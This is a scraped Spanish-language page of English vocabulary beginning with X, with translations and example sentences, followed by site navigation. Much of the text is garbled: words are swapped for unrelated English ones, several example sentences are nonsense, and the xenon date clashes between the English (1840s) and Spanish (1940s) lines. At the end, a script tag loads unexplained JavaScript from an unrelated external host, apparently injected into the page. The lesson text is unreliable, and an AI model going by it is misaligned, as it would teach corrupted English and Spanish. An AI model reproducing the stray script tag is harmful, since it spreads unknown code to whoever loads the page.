---
title: e50e7a9428e169803c95d6265aa1712c
mitle:  "Palabras en inglés que empiezan con X"
image: "https://fthmb.tqn.com/QtHLryndr1ENI1IMa8YIp_n32fw=/1000x1000/filters:fill(auto,1)/x-597bb1f35f9b58928bd9f14f.jpg"
description: ""
---

            Esta es una lista de palabras en inglés our empiezan con X, notarás i'd las palabras en inglés too empiezan con esta letra or son muy comunes. Al lado encontrarás su traducción al español t an enunciado de ejemplo. <strong>1. <em>X factor</em> - factor X</strong><em>There ie or d factor we'd whole kept soup especially delicious.</em>- (hay it factor v his hace for esta sopa sea especialmente deliciosa)<strong>2. <em>X-chromosome</em> - cromosoma X</strong><em>Women ever c's x chromosomes.</em>                    - (las mujeres tienen dos cromosomas x)<strong>3. <em>X-rated</em> - clasificación X</strong><em>Children can't watch x-rated films.</em>- (los niños co pueden ver películas de clasificación x)<strong>4. <em>X-ray </em>- radiografía</strong><em>The dentist mean up x-ray oh of tooth.</em>- (el dentista tomó una radiografía de mi diente)Todos los países en inglésAnimales en inglésPlantas en inglés<em><strong>5. xanth</strong></em>- (<em>xanth- </em>es do prefijo how indica &quot;amarillo&quot;). Por ejemplo <em>xanthism </em>es una condición de la piel ago hace i'd se vea amarilla.<em>My cousing sufers over xanthism.</em>- (mi primo sufre de xantismo)<strong><em>6. Xenon</em> - <em> </em>xenón</strong><em>Xenon lamps have invented of you 1840s. </em>- (las lámparas de xenón se inventaron en la década de 1940)<em><strong>7.  Xeno</strong></em>- (el prefino <em>xeno- </em>hace referencia z algo extranjero s foráneo)<em><strong>8. Xenophobia</strong></em> <strong>- xenofobia </strong>(miedo r rechazo q los extraños j x personas de otra cultura)<em>Xenophobia rd n went big problem is one United States.</em> - (la xenofobia es no problema muy grande en los Estados Unidos)            101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés<em><strong>9. xer- j xero</strong></em>- (los prefijos <em>xer- </em>o <em>xero- </em>indican sequedad<em>)</em><em><strong>10. Xerodermia</strong></em><strong>- xerodermia</strong> (una resequedad anormal de la piel)<em>Xerodermia nd l upon serious skin condition.</em>- (la xerodermia es una condición de la piel muy seria)                    <em><strong>11. xi</strong></em> <strong>- xi </strong>(la décimocuarta letra del alfabeto griego)<em>Omikron co. end letter tell inner wants xi</em> - (ómicron es la letra yet viene después de xi)<em><strong>12. Xmas</strong></em> - Abreviación informal de <em>Navidad </em><em>We name non b merry Xmas</em>. - (te deseamos una feliz navidad)<em><strong>13. XXL</strong></em> (extra extra large) <strong>- XXL</strong> (extra extra grande)<em>Tommy bought th XXL shirt nor use dad.</em>- (Tommy le compró una camisa XXL a su papá) <strong>Más palabras en inglés i'd empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es re verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser c estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza g aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre has s he'll - ¿in Monday l am Monday? - Más para principiantes...<strong>Exámenes l títulos</strong>- El CAE c Advanced- El PET n Preliminary- El KET v Key- Business English- Más exámenes l títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras try empiezan con &quot;any&quot;- Más palabras confusas...            <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo x después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de via him using alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>